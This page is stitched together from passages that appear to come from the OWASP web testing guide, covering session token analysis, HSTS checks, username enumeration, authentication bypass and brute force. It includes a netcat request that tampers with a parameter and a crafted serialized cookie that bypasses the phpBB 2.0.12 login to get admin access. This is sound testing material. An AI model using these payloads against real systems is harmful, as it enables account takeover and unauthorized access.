      <li>Analyze and ensure that enough randomness exists to stop session forging attacks.</li>
      <li>Modify cookies that are not signed and contain information that can be manipulated.</li>
      </ul>
      <h2 id="how-to-test">How to Test</h2>
      <h3 id="black-box-testing-and-examples">Black-Box Testing and Examples</h3>
      <p>All interaction between the client and application should be tested at least against the following criteria:</p>
      <ul>
      <li>Are all <code class="language-plaintext highlighter-rouge">Set-Cookie</code> directives tagged as <code class="language-plaintext highlighter-rouge">Secure</code>?</li>
      <li>Do any Cookie operations take place over unencrypted transport?</li>
      <li>Can the Cookie be forced over unencrypted transport?</li>
      <li>If so, how does the application maintain security?</li>
      <li>Are any Cookies persistent?</li>
      <li>What <code class="language-plaintext highlighter-rouge">Expires</code> times are used on persistent cookies, and are they reasonable?</li>
      <li>Are cookies that are expected to be transient configured as such?</li>
      <li>What HTTP/1.1 <code class="language-plaintext highlighter-rouge">Cache-Control</code> settings are used to protect Cookies?</li>
      <li>What HTTP/1.0 <code class="language-plaintext highlighter-rouge">Cache-Control</code> settings are used to protect Cookies?</li>
      </ul>
      <h4 id="cookie-collection">Cookie Collection</h4>
      <p>The first step required to manipulate the cookie is to understand how the application creates and manages cookies. For this task, testers have to try to answer the following questions:</p>
      <ul>
      <li>
      <p>How many cookies are used by the application?</p>
      <p>Surf the application. Note when cookies are created. Make a list of received cookies, the page that sets them (with the set-cookie directive), the domain for which they are valid, their value, and their characteristics.</p>
      </li>
      <li>
      <p>Which parts of the application generate or modify the cookie?</p>
      <p>Surfing the application, find which cookies remain constant and which get modified. What events modify the cookie?</p>
      </li>
      <li>
      <p>Which parts of the application require this cookie in order to be accessed and utilized?</p>
      <p>Find out which parts of the application need a cookie. Access a page, then try again without the cookie, or with a modified value of it. Try to map which cookies are used where.</p>
      </li>
      </ul>
      <p>A spreadsheet mapping each cookie to the corresponding application parts and the related information can be a valuable output of this phase.</p>
      <h4 id="session-analysis">Session Analysis</h4>
      <p>The session tokens (Cookie, SessionID or Hidden Field) themselves should be examined to ensure their quality from a security perspective. They should be tested against criteria such as their randomness, uniqueness, resistance to statistical and cryptographic analysis and information leakage.</p>
      <ul>
      <li>Token Structure &amp; Information Leakage</li>
      </ul>
      <p>The first stage is to examine the structure and content of a Session ID provided by the application. A common mistake is to include specific data in the Token instead of issuing a generic value and referencing real data server-side.</p>
      <p>If the Session ID is clear-text, the structure and pertinent data may be immediately obvious such as <code class="language-plaintext highlighter-rouge">192.168.100.1:owaspuser:password:15:58</code>.</p>
      <p>If part or the entire token appears to be encoded or hashed, it should be compared to various techniques to check for obvious obfuscation. For example the string <code class="language-plaintext highlighter-rouge">192.168.100.1:owaspuser:password:15:58</code> is represented in hex, base64, and as an MD5 hash:</p>
      <ul>
      <li>Hex: <code class="language-plaintext highlighter-rouge">3139322E3136382E3130302E313A6F77617370757365723A70617373776F72643A31353A3538</code></li>
      <li>Base64: <code class="language-plaintext highlighter-rouge">MTkyLjE2OC4xMDAuMTpvd2FzcHVzZXI6cGFzc3dvcmQ6MTU6NTg=</code></li>
      <li>MD5: <code class="language-plaintext highlighter-rouge">01c2fc4f0a817afd8366689bd29dd40a</code></li>
      </ul>
      <p>Having identified the type of obfuscation, it may be possible to decode back to the original data. In most cases, however, this is unlikely. Even so, it may be useful to enumerate the encoding in place from the format of the message. Furthermore, if both the format and obfuscation technique can be deduced, automated brute-force attacks could be devised.</p>
      <p>Hybrid tokens may include information such as IP address or User ID together with an encoded portion, such as <code class="language-plaintext highlighter-rouge">owaspuser:192.168.100.1:a7656fafe94dae72b1e1487670148412</code>.</p>
      <p>Having analyzed a single session token, the representative sample should be examined. A simple analysis of the tokens should immediately reveal any obvious patterns. For example, a 32 bit token may include 16 bits of static data and 16 bits of variable data. This may indicate that the first 16 bits represent a fixed attribute of the user &ndash; e.g. the username or IP address. If the second 16 bit chunk is incrementing at a regular rate, it may indicate a sequential or even time-based element to the token generation. See examples.</p>
      <p>If static elements to the Tokens are identified, further samples should be gathered, varying one potential input element at a time. For example, log in attempts through a different user account or from a different IP address may yield a variance in the previously static portion of the session token.</p>
      <p>The following areas should be addressed during the single and multiple Session ID structure testing:</p>
      <ul>
      <li>What parts of the Session ID are static?</li>
      <li>What clear-text confidential information is stored in the Session ID? E.g. usernames/UID, IP addresses</li>
      <li>What easily decoded confidential information is stored?</li>
      <li>What information can be deduced from the structure of the Session ID?</li>
      <li>What portions of the Session ID are static for the same log in conditions?</li>
      <li>What obvious patterns are present in the Session ID as a whole, or individual portions?</li>
      </ul>
      <h4 id="session-id-predictability-and-randomness">Session ID Predictability and Randomness</h4>
      <p>Analysis of the variable areas (if any) of the Session ID should be undertaken to establish the existence of any recognizable or predictable patterns. These analyses may be performed manually and with bespoke or OTS statistical or cryptanalytic tools to deduce any patterns in the Session ID content. Manual checks should include comparisons of Session IDs issued for the same login conditions &ndash; e.g., the same username, password, and IP address.</p>
      <p>Time is an important factor which must also be controlled. High numbers of simultaneous connections should be made in order to gather samples in the same time window and keep that variable constant. Even a quantization of 50ms or less may be too coarse and a sample taken in this way may reveal time-based components that would otherwise be missed.</p>
      <p>Variable elements should be analyzed over time to determine whether they are incremental in nature. Where they are incremental, patterns relating to absolute or elapsed time should be investigated. Many systems use time as a seed for their pseudo-random elements. Where the patterns are seemingly random, one-way hashes of time or other environmental variations should be considered as a possibility. Typically, the result of a cryptographic hash is a decimal or hexadecimal number so should be identifiable.</p>
      <p>In analyzing Session ID sequences, patterns or cycles, static elements and client dependencies should all be considered as possible contributing elements to the structure and function of the application.</p>
      <ul>
      <li>Are the Session IDs provably random in nature? Can the resulting values be reproduced?</li>
      <li>Do the same input conditions produce the same ID on a subsequent run?</li>
      <li>Are the Session IDs provably resistant to statistical or cryptanalysis?</li>
      <li>What elements of the Session IDs are time-linked?</li>
      <li>What portions of the Session IDs are predictable?</li>
      <li>Can the next ID be deduced, given full knowledge of the generation algorithm and previous IDs?</li>
      </ul>
      <h4 id="cookie-reverse-engineering">Cookie Reverse Engineering</h4>
      <p>Now that the tester has enumerated the cookies and has a general idea of their use, it is time to have a deeper look at cookies that seem interesting. Which cookies is the tester interested in? A cookie, in order to provide a secure method of session management, must combine several characteristics, each of which is aimed at protecting the cookie from a different class of attacks.</p>
      <p>These characteristics are summarized below:</p>
      <ol>
      <li>Unpredictability: a cookie must contain some amount of hard-to-guess data. The harder it is to forge a valid cookie, the harder is to break into legitimate user&rsquo;s session. If an attacker can guess the cookie used in an active session of a legitimate user, they will be able to fully impersonate that user (session hijacking). In order to make a cookie unpredictable, random values or cryptography can be used.</li>
      <li>Tamper resistance: a cookie must resist malicious attempts of modification. If the tester receives a cookie like <code class="language-plaintext highlighter-rouge">IsAdmin=No</code>, it is trivial to modify it to get administrative rights, unless the application performs a double check (for instance, appending to the cookie an encrypted hash of its value)</li>
      <li>Expiration: a critical cookie must be valid only for an appropriate period of time and must be deleted from the disk or memory afterwards to avoid the risk of being replayed. This does not apply to cookies that store non-critical data that needs to be remembered across sessions (e.g., site look-and-feel).</li>
      <li><code class="language-plaintext highlighter-rouge">Secure</code> flag: a cookie whose value is critical for the integrity of the session should have this flag enabled in order to allow its transmission only in an encrypted channel to deter eavesdropping.</li>
      </ol>
      <p>The approach here is to collect a sufficient number of instances of a cookie and start looking for patterns in their value. The exact meaning of &ldquo;sufficient&rdquo; can vary from a handful of samples, if the cookie generation method is very easy to break, to several thousands, if the tester needs to proceed with some mathematical analysis (e.g., chi-squares, attractors. See later for more information).</p>
      <p>It is important to pay particular attention to the workflow of the application, as the state of a session can have a heavy impact on collected cookies. A cookie collected before being authenticated can be very different from a cookie obtained after the authentication.</p>
      <p>Another aspect to keep into consideration is time. Always record the exact time when a cookie has been obtained, when there is the possibility that time plays a role in the value of the cookie (the server could use a timestamp as part of the cookie value). The time recorded could be the local time or the server&rsquo;s timestamp included in the HTTP response (or both).</p>
      <p>When analyzing the collected values, the tester should try to figure out all variables that could have influenced the cookie value and try to vary them one at the time. Passing to the server modified versions of the same cookie can be very helpful in understanding how the application reads and processes the cookie.</p>
      <p>Examples of checks to be performed at this stage include:</p>
      <ul>
      <li>What character set is used in the cookie? Has the cookie a numeric value? alphanumeric? hexadecimal? What happens if the tester inserts in a cookie characters that do not belong to the expected charset?</li>
      <li>Is the cookie composed of different sub-parts carrying different pieces of information? How are the different parts separated? With which delimiters? Some parts of the cookie could have a higher variance, others might be constant, others could assume only a limited set of values. Breaking down the cookie to its base components is the first and fundamental step.</li>
      </ul>
      <p>An example of an easy-to-spot structured cookie is the following:</p>
      <div class="language-text highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code>ID=5a0acfc7ffeb919:CR=1:TM=1120514521:LM=1120514521:S=j3am5KzC4v01ba3q
      </code></pre>
      </div>
      </div>
      <p>This example shows 5 different fields, carrying different types of data:</p>
      <ul>
      <li>ID &ndash; hexadecimal</li>
      <li>CR &ndash; small integer</li>
      <li>TM and LM &ndash; large integer. (And curiously they hold the same value. Worth to see what happens modifying one of them)</li>
      <li>S &ndash; alphanumeric</li>
      </ul>
      <p>Even when no delimiters are used, having enough samples can help understand the structure.</p>
      <h4 id="brute-force-attacks">Brute Force Attacks</h4>
      <p>Brute force attacks inevitably lead on from questions relating to predictability and randomness. The variance within the Session IDs must be considered together with application session duration and timeouts. If the variation within the Session IDs is relatively small, and Session ID validity is long, the likelihood of a successful brute-force attack is much higher.</p>
      <p>A long Session ID (or rather one with a great deal of variance) and a shorter validity period would make it far harder to succeed in a brute force attack.</p>
      <ul>
      <li>How long would a brute-force attack on all possible Session IDs take?</li>
      <li>Is the Session ID space large enough to prevent brute forcing? For example, is the length of the key sufficient when compared to the valid life-span?</li>
      <li>Do delays between connection attempts with different Session IDs mitigate the risk of this attack?</li>
      </ul>
      <h3 id="gray-box-testing-and-example">Gray-Box Testing and Example</h3>
      <p>If the tester has access to the session management schema implementation, they can check for the following:</p>
      <ul>
      <li>
      <p>Random Session Token</p>
      <p>The Session ID or Cookie issued to the client should not be easily predictable (don&rsquo;t use linear algorithms based on predictable variables such as the client IP address). The use of cryptographic algorithms with key length of 256 bits is encouraged (like AES).</p>
      </li>
      <li>
      <p>Token length</p>
      <p>Session ID will be at least 50 characters length.</p>
      </li>
      <li>
      <p>Session Time-out</p>
      <p>Session token should have a defined time-out (it depends on the criticality of the application managed data)</p>
      </li>
      <li>
      <p>Cookie configuration:</p>
      <ul>
      <li>non-persistent: only RAM memory</li>
      <li>secure (set only on HTTPS channel): <code class="language-plaintext highlighter-rouge">Set-Cookie: cookie=data; path=/; domain=.aaa.it; secure</code></li>

	      <sl-details summary="HSTS" open>
			   <h4>HTTP Strict Transport Security (HSTS) is a security feature that instructs browsers to only communicate with the server using HTTPS, preventing downgrade attacks and cookie hijacking. It is essential for websites that handle sensitive information. Here's how to check if HSTS is in use for a website.</h4>

    <h2>What is HSTS?</h2>
    <p>HSTS is a web security policy mechanism that forces web browsers to interact with websites over HTTPS, even if the user initially attempts to connect using HTTP. When a server includes a special HTTP header, browsers will enforce the rule to use HTTPS for all subsequent connections to the site, improving overall security by preventing man-in-the-middle (MITM) and downgrade attacks.</p>

    <h2>How to Check if HSTS is in Use</h2>
    <p>To check if HSTS is implemented on a website, look for the presence of the <strong>Strict-Transport-Security</strong> header in the HTTP response. This header tells the browser to enforce HTTPS for the domain for a specified duration. The following steps explain how to check if HSTS is in use:</p>

    <h3>Method 1: Using Browser Developer Tools</h3>
    <ol>
        <li>Open the website in your browser (e.g., Chrome, Firefox).</li>
        <li>Right-click on the page and select <strong>Inspect</strong> or press <strong>Ctrl+Shift+I</strong> to open Developer Tools.</li>
        <li>Go to the <strong>Network</strong> tab.</li>
        <li>Refresh the page and look for the request to the website's main domain.</li>
        <li>Click on the request, and check the <strong>Response Headers</strong>.</li>
        <li>Look for the <strong>Strict-Transport-Security</strong> header in the list. If present, the website is enforcing HSTS.</li>
    </ol>

    <h3>Method 2: Using Curl Command</h3>
    <p>If you prefer using the command line, you can use the <code>curl</code> tool to check the response headers of a website:</p>
    <pre>
        curl -I https://example.com
    </pre>
    <p>Look for the <strong>Strict-Transport-Security</strong> header in the response. A valid HSTS header will look something like:</p>
    <pre>
        HTTP/1.1 200 OK
        Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    </pre>
    <p>In this example, the server has HSTS enabled for one year (31536000 seconds), and the <code>includeSubDomains</code> directive ensures that all subdomains also use HTTPS.</p>

    <h3>Method 3: Using Online Tools</h3>
    <p>You can also use online tools to check if a website has HSTS enabled:</p>
    <ul>
        <li><a href="https://www.ssllabs.com/ssltest/" target="_blank">SSL Labs SSL Test</a>: Provides an in-depth analysis of SSL/TLS security and checks for HSTS headers.</li>
        <li><a href="https://hstspreload.org/" target="_blank">HSTS Preload List</a>: Allows you to check if the site is on the HSTS preload list maintained by browsers.</li>
    </ul>

    <h2>Understanding the Strict-Transport-Security Header</h2>
    <p>The <strong>Strict-Transport-Security</strong> header can contain several directives, which define how long the browser should enforce the HTTPS-only policy:</p>
    <ul>
        <li><strong>max-age:</strong> The duration in seconds for which the browser should enforce HTTPS. For example, <code>max-age=31536000</code> will enforce HTTPS for 1 year.</li>
        <li><strong>includeSubDomains:</strong> This directive applies the HSTS policy to all subdomains of the domain. If not included, the policy applies only to the domain itself.</li>
        <li><strong>preload:</strong> This directive indicates that the domain should be included in the browser’s HSTS preload list. Preloading ensures that browsers will enforce HTTPS even before the first connection to the domain is made.</li>
    </ul>

    <h2>Why is HSTS Important?</h2>
    <p>HSTS is crucial for securing websites, particularly those dealing with sensitive user data. Here’s why it’s important:</p>
    <ul>
        <li><strong>Prevents Man-in-the-Middle (MITM) Attacks:</strong> HSTS ensures that all traffic between the user and the server is encrypted, protecting against attackers who might intercept or alter the communication.</li>
        <li><strong>Prevents Downgrade Attacks:</strong> Without HSTS, attackers could redirect traffic to an unencrypted HTTP connection, allowing for various attacks. HSTS ensures only HTTPS is used.</li>
        <li><strong>Improves User Trust:</strong> With HTTPS and HSTS in place, users can trust that their data is being securely transmitted, which is especially important for login forms, payment pages, and other sensitive operations.</li>
    </ul>

          <h1>Testing for Account Enumeration and Guessable User Account</h1></br>
          <h4>The scope of this test is to verify if it is possible to collect a set of valid usernames by interacting with the authentication mechanism of the application. This test will be useful for brute force testing, in which the tester verifies if, given a valid username, it is possible to find the corresponding password.</h4>
          <p>Often, web applications reveal when a username exists on system, either as a consequence of mis-configuration or as a design decision. For example, sometimes, when we submit wrong credentials, we receive a message that states that either the username is present on the system or the provided password is wrong. The information obtained can be used by an attacker to gain a list of users on system. This information can be used to attack the web application, for example, through a brute force or default username and password attack.</p>
          <p>The tester should interact with the authentication mechanism of the application to understand if sending particular requests causes the application to answer in different manners. This issue exists because the information released from web application or web server when the user provide a valid username is different than when they use an invalid one.</p>
          <p>In some cases, a message is received that reveals if the provided credentials are wrong because an invalid username or an invalid password was used. Sometimes, testers can enumerate the existing users by sending a username and an empty password.</p>
          <h2>Test Objectives</h2>
          <ul>
              <li>Review processes that pertain to user identification (<em>e.g.</em> registration, login, etc.).</li>
              <li>Enumerate users where possible through response analysis.</li>
          </ul>
          <h2>How to Test</h2>
          <p>In black-box testing, the tester knows nothing about the specific application, username, application logic, error messages on log in page, or password recovery facilities. If the application is vulnerable, the tester receives a response message that reveals, directly or indirectly, some information useful for enumerating users.</p>
          <h3>HTTP Response Message</h3>
          <h4>Testing for Valid Credentials</h4>
          <p>Record the server answer when you submit a valid user ID and valid password.</p>
          <blockquote>
              <p>Using a web proxy, notice the information retrieved from this successful authentication (HTTP 200 Response, length of the response).</p>
          </blockquote>
          <h4>Testing for Valid User with Wrong Password</h4>
          <p>Now, the tester should try to insert a valid user ID and a wrong password and record the error message generated by the application.</p>
          <blockquote>
              <p>The browser should display a message similar to the following one:</p>&nbsp;<p><img src="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/03-Identity_Management_Testing/images/AuthenticationFailed.png" alt="Authentication Failed"><br><em>Figure 4.3.4-1: Authentication Failed</em></p>&nbsp;<p>Unlike any message that reveals the existence of the user like the following:</p>&nbsp;<p><code>Login for User foo: invalid password</code></p>&nbsp;<p>Using a web proxy, notice the information retrieved from this unsuccessful authentication attempt (HTTP 200 Response, length of the response).</p>
          </blockquote>
          <h4>Testing for a Nonexistent Username</h4>
          <p>Now, the tester should try to insert an invalid user ID and a wrong password and record the server answer (the tester should be confident that the username is not valid in the application). Record the error message and the server answer.</p>
          <blockquote>
              <p>If the tester enters a nonexistent user ID, they can receive a message similar to:</p>&nbsp;<p><img src="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/03-Identity_Management_Testing/images/Userisnotactive.png" alt="This User is Not Active"><br><em>Figure 4.3.4-3: This User is Not Active</em></p>&nbsp;<p>or a message like the following one:</p>&nbsp;<p><code>Login&nbsp;failed&nbsp;for&nbsp;User&nbsp;foo:&nbsp;invalid&nbsp;Account</code></p>&nbsp;<p>Generally the application should respond with the same error message and length to the different incorrect requests. If the responses are not the same, the tester should investigate and find out the key that creates a difference between the two responses. For example:</p>&nbsp;<ol>
                  <li>Client request: Valid user/wrong password</li>
                  <li>&nbsp; &nbsp;</li>
                  <li>Server response: The password is not correct</li>
                  <li>&nbsp; &nbsp;</li>
                  <li>Client request: Wrong user/wrong password</li>
                  <li>&nbsp; &nbsp;</li>
                  <li>Server response: User not recognized</li>
              </ol>&nbsp;<p>The above responses let the client understand that for the first request they have a valid username. So they can interact with the application requesting a set of possible user IDs and observing the answer.</p>&nbsp;<p>Looking at the second server response, the tester understand in the same way that they don&rsquo;t hold a valid username. So they can interact in the same manner and create a list of valid user ID looking at the server answers.</p>
          </blockquote>
          <h3>Other Ways to Enumerate Users</h3>
          <p>Testers can enumerate users in several ways, such as:</p>
          <h4>Analyzing the Error Code Received on Login Pages</h4>
          <p>Some web application release a specific error code or message that we can analyze.</p>
          <h4>Analyzing URLs and URLs Re-directions</h4>
          <p>For example:</p>
          <ul>
              <li><code>http://www.foo.com/err.jsp?User=baduser&amp;Error=0</code></li>
              <li>&nbsp;</li>
              <li><code>http://www.foo.com/err.jsp?User=gooduser&amp;Error=2</code></li>
          </ul>
          <p>As is seen above, when a tester provides a user ID and password to the web application, they see a message indication that an error has occurred in the URL. In the first case they have provided a bad user ID and bad password. In the second, a good user ID and a bad password, so they can identify a valid user ID.</p>
          <h4>URI Probing</h4>
          <p>Sometimes a web server responds differently if it receives a request for an existing directory or not. For instance in some portals every user is associated with a directory. If testers try to access an existing directory they could receive a web server error.</p>
          <p>Some of the common errors received from web servers are:</p>
          <ul>
              <li>403 Forbidden error code</li>
              <li>404 Not found error code</li>
          </ul>
          <p>Example:</p>
          <ul>
              <li><code>http://www.foo.com/account1</code> - we receive from web server: 403 Forbidden</li>
              <li>&nbsp;</li>
              <li><code>http://www.foo.com/account2</code> - we receive from web server: 404 file Not Found</li>
          </ul>
          <p>In the first case the user exists, but the tester cannot view the web page, in second case instead the user &ldquo;account2&rdquo; does not exist. By collecting this information testers can enumerate the users.</p>
          <h4>Analyzing Web Page Titles</h4>
          <p>Testers can receive useful information on Title of web page, where they can obtain a specific error code or messages that reveal if the problems are with the username or password.</p>
          <p>For instance, if a user cannot authenticate to an application and receives a web page whose title is similar to:</p>
          <ul>
              <li><code>Invalid&nbsp;user</code></li>
              <li><code>Invalid&nbsp;authentication</code></li>
          </ul>
          <h4>Analyzing a Message Received from a Recovery Facility</h4>
          <p>When we use a recovery facility (i.e. a forgotten password function) a vulnerable application might return a message that reveals if a username exists or not.</p>
          <p>For example, messages similar to the following:</p>
          <ul>
              <li><code>Invalid username: email address is not valid or the specified user was not found.</code></li>
              <li><code>Valid&nbsp;username:&nbsp;Your&nbsp;password&nbsp;has&nbsp;been&nbsp;successfully&nbsp;sent&nbsp;to&nbsp;the&nbsp;email&nbsp;address&nbsp;you&nbsp;registered&nbsp;with.</code></li>
          </ul>
          <h4>Friendly 404 Error Message</h4>
          <p>When we request a user within the directory that does not exist, we don&rsquo;t always receive 404 error code. Instead, we may receive &ldquo;200 ok&rdquo; with an image, in this case we can assume that when we receive the specific image the user does not exist. This logic can be applied to other web server response; the trick is a good analysis of web server and web application messages.</p>
          <h4>Analyzing Response Times</h4>
          <p>As well as looking at the content of the responses, the time that the response take should also be considered. Particularly where the request causes an interaction with an external service (such as sending a forgotten password email), this can add several hundred milliseconds to the response, which can be used to determine whether the requested user is valid.</p>
          <h3>Guessing Users</h3>
          <p>In some cases the user IDs are created with specific policies of administrator or company. For example we can view a user with a user ID created in sequential order:</p>
          <div>
              <div>
                  <pre><code>CN000100
      CN000101
      ...
      </code></pre>
              </div>
          </div>
          <p>Sometimes the usernames are created with a REALM alias and then a sequential numbers:</p>
          <ul>
              <li>R1001 &ndash; user 001 for REALM1</li>
              <li>R2001 &ndash; user 001 for REALM2</li>
          </ul>
          <p>In the above sample we can create simple shell scripts that compose user IDs and submit a request with tool like wget to automate a web query to discern valid user IDs. To create a script we can also use Perl and curl.</p>
          <p>Other possibilities are: - user IDs associated with credit card numbers, or in general numbers with a pattern. - user IDs associated with real names, e.g. if Freddie Mercury has a user ID of &ldquo;fmercury&rdquo;, then you might guess Roger Taylor to have the user ID of &ldquo;rtaylor&rdquo;.</p>
          <p>Again, we can guess a username from the information received from an LDAP query or from Google information gathering, for example, from a specific domain. Google can help to find domain users through specific queries or through a simple shell script or tool.</p>
          <blockquote>
              <p>By enumerating user accounts, you risk locking out accounts after a predefined number of failed probes (based on application policy). Also, sometimes, your IP address can be banned by dynamic rules on the application firewall or Intrusion Prevention System.</p>
          </blockquote>
          <h3>Gray-Box Testing</h3>
          <h4>Testing for Authentication Error Messages</h4>
          <p>Verify that the application answers in the same manner for every client request that produces a failed authentication. For this issue the black-box testing and gray-box testing have the same concept based on the analysis of messages or error codes received from web application.</p>
          <blockquote>
              <p>The application should answer in the same manner for every failed attempt of authentication.</p>&nbsp;<p>For Example: <em>Credentials submitted are not valid</em></p>
          </blockquote>
          <h2>Remediation</h2>
          <p>Ensure the application returns consistent generic error messages in response to invalid account name, password or other user credentials entered during the log in process.</p>
          <p>Ensure default system accounts and test accounts are deleted prior to releasing the system into production (or exposing it to an untrusted network).</p>

      <h1>Testing for Bypassing Authentication Schema</h1>
    </br>
      <h4>In computer security, authentication is the process of attempting to verify the digital identity of the sender of a communication. A common example of such a process is the log on process. Testing the authentication schema means understanding how the authentication process works and using that information to circumvent the authentication mechanism.</h4>
      <h4>While most applications require authentication to gain access to private information or to execute tasks, not every authentication method is able to provide adequate security. Negligence, ignorance, or simple understatement of security threats often result in authentication schemes that can be bypassed by simply skipping the log in page and directly calling an internal page that is supposed to be accessed only after authentication has been performed.</h4>
      <p>In addition, it is often possible to bypass authentication measures by tampering with requests and tricking the application into thinking that the user is already authenticated. This can be accomplished either by modifying the given URL parameter, by manipulating the form, or by counterfeiting sessions.</p>
      <p>Problems related to the authentication schema can be found at different stages of the software development lifecycle (SDLC), like the design, development, and deployment phases:</p>
      <ul>
          <li>In the design phase errors can include a wrong definition of application sections to be protected, the choice of not applying strong encryption protocols for securing the transmission of credentials, and many more.</li>
          <li>&nbsp;</li>
          <li>In the development phase errors can include the incorrect implementation of input validation functionality or not following the security best practices for the specific language.</li>
          <li>&nbsp;</li>
          <li>In the application deployment phase, there may be issues during the application setup (installation and configuration activities) due to a lack in required technical skills or due to the lack of good documentation.</li>
      </ul>
      <h2>Test Objectives</h2>
      <ul>
          <li>Ensure that authentication is applied across all services that require it.</li>
      </ul>
      <h2>How to Test</h2>
      <p>There are several methods of bypassing the authentication schema that is used by a web application:</p>
      <ul>
          <li>Direct page request (<a href="https://owasp.org/www-community/attacks/Forced_browsing">forced browsing</a>)</li>
          <li>&nbsp;</li>
          <li>Parameter modification</li>
          <li>&nbsp;</li>
          <li>Session ID prediction</li>
          <li>&nbsp;</li>
          <li>SQL injection</li>
      </ul>
      <h3>Direct Page Request</h3>
      <p>If a web application implements access control only on the log in page, the authentication schema could be bypassed. For example, if a user directly requests a different page via forced browsing, that page may not check the credentials of the user before granting access. Attempt to directly access a protected page through the address bar in your browser to test using this method.</p>
      <p><img src="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/images/Basm-directreq.jpg" alt="Direct Request to Protected Page"><br><em>Figure 4.4.4-1: Direct Request to Protected Page</em></p>
      <h3>Parameter Modification</h3>
      <p>Another problem related to authentication design is when the application verifies a successful log in on the basis of a fixed value parameters. A user could modify these parameters to gain access to the protected areas without providing valid credentials. In the example below, the &ldquo;authenticated&rdquo; parameter is changed to a value of &ldquo;yes&rdquo;, which allows the user to gain access. In this example, the parameter is in the URL, but a proxy could also be used to modify the parameter, especially when the parameters are sent as form elements in a POST request or when the parameters are stored in a cookie.</p>
      <div>
          <div>
              <pre><code>http://www.site.com/page.asp?authenticated=no

      raven@blackbox /home $nc www.site.com 80
      GET /page.asp?authenticated=yes HTTP/1.0

      HTTP/1.1 200 OK

      &lt;/HEAD&gt;&lt;BODY&gt;
      &lt;H1&gt;You Are Authenticated&lt;/H1&gt;
      &lt;/BODY&gt;&lt;/HTML&gt;

      <h3>Session ID Prediction</h3>
      <p>Many web applications manage authentication by using session identifiers (session IDs). Therefore, if session ID generation is predictable, a malicious user could be able to find a valid session ID and gain unauthorized access to the application, impersonating a previously authenticated user.</p>
      <p>In the following figure, values inside cookies increase linearly, so it could be easy for an attacker to guess a valid session ID.</p>
      <p><img src="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/images/Basm-sessid.jpg" alt="Cookie Values Over Time"><br><em>Figure 4.4.4-3: Cookie Values Over Time</em></p>
      <p>In the following figure, values inside cookies change only partially, so it&rsquo;s possible to restrict a brute force attack to the defined fields shown below.</p>
      <p><img src="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/images/Basm-sessid2.jpg" alt="Partially Changed Cookie Values"><br><em>Figure 4.4.4-4: Partially Changed Cookie Values</em></p>
      <h3>SQL Injection (HTML Form Authentication)</h3>
      <p>SQL Injection is a widely known attack technique. This section is not going to describe this technique in detail as there are several sections in this guide that explain injection techniques beyond the scope of this section.</p>
      <p><img src="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/images/Basm-sqlinj.jpg" alt="SQL Injection"><br><em>Figure 4.4.4-5: SQL Injection</em></p>
      <p>The following figure shows that with a simple SQL injection attack, it is sometimes possible to bypass the authentication form.</p>
      <p><img src="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/images/Basm-sqlinj2.gif" alt="Simple SQL Injection Attack"><br><em>Figure 4.4.4-6: Simple SQL Injection Attack</em></p>
      <h3>PHP Loose Comparison</h3>
      <p>If an attacker has been able to retrieve the application source code by exploiting a previously discovered vulnerability (e.g., directory traversal), or from a web repository (Open Source Applications), it could be possible to perform refined attacks against the implementation of the authentication process.</p>
      <p>In the following example (PHPBB 2.0.12 - Authentication Bypass Vulnerability), at line 2 the <code>unserialize()</code> function parses a user supplied cookie and sets values inside the <code>$sessiondata</code> array. At line 7, the user&rsquo;s MD5 password hash stored inside the backend database (<code>$auto_login_key</code>) is compared to the one supplied (<code>$sessiondata[&apos;autologinid&apos;]</code>) by the user.</p>
      <div>
          <div>
              <pre><code>1. if (isset($HTTP_COOKIE_VARS[$cookiename . &apos;_sid&apos;])) {
      2.     $sessiondata = isset($HTTP_COOKIE_VARS[$cookiename . &apos;_data&apos;]) ? unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . &apos;_data&apos;])) : array();
      3.     $sessionmethod = SESSION_METHOD_COOKIE;
      4. }
      5. $auto_login_key = $userdata[&apos;user_password&apos;];
      6. // We have to login automagically
      7. if( $sessiondata[&apos;autologinid&apos;] == $auto_login_key )
      8. {
      9.     // autologinid matches password
      10.     $login = 1;
      11.     $enable_autologin = 1;
      12. }

      </code></pre>
          </div>
      </div>
      <p>In PHP, a comparison between a string value and a <code>true</code> boolean value is always <code>true</code> (because the string contains a value), so by supplying the following string to the <code>unserialize()</code> function, it is possible to bypass the authentication control and log in as administrator, whose <code>userid</code> is 2:</p>
      <div>
          <div>
              <pre><code>a:2:{s:11:&quot;autologinid&quot;;b:1;s:6:&quot;userid&quot;;s:1:&quot;2&quot;;}  // original value: a:2:{s:11:&quot;autologinid&quot;;s:32:&quot;8b8e9715d12e4ca12c4c3eb4865aaf6a&quot;;s:6:&quot;userid&quot;;s:4:&quot;1337&quot;;}
      </code></pre>
          </div>
      </div>
      <p>Let&rsquo;s disassemble what we did in this string:</p>
      <ol>
          <li><code>autologinid</code> is now a boolean set to <code>true</code>: this can be seen by replacing the MD5 value of the password hash (<code>s:32:&quot;8b8e9715d12e4ca12c4c3eb4865aaf6a&quot;</code>) with <code>b:1</code></li>
          <li>&nbsp;</li>
          <li><code>userid</code> is now set to the admin id: this can be seen in the last piece of the string, where we replaced our regular user ID (<code>s:4:&quot;1337&quot;</code>) with <code>s:1:&quot;2&quot;</code></li>
      </ol>

      <h3>How to Test for Brute Force Vulnerabilities</h3>
      <p>See the <a href="https://owasp.org/www-project-web-security-testing-guide/">OWASP Testing Guide</a> article on how toTest for Brute Force Vulnerabilities.</p>
      <h2>Description</h2>
      <p>A brute force attack can manifest itself in many different ways, butprimarily consists in an attacker configuring predetermined values,making requests to a server using those values, and then analyzing theresponse. For the sake of efficiency, an attacker may use a dictionaryattack (with or without mutations) or a traditional brute-force attack(with given classes of characters e.g.: alphanumeric, special, case(in)sensitive). Considering a given method, number of tries, efficiencyof the system which conducts the attack, and estimated efficiency of thesystem which is attacked the attacker is able to calculate approximatelyhow long it will take to submit all chosen predetermined values.</p>
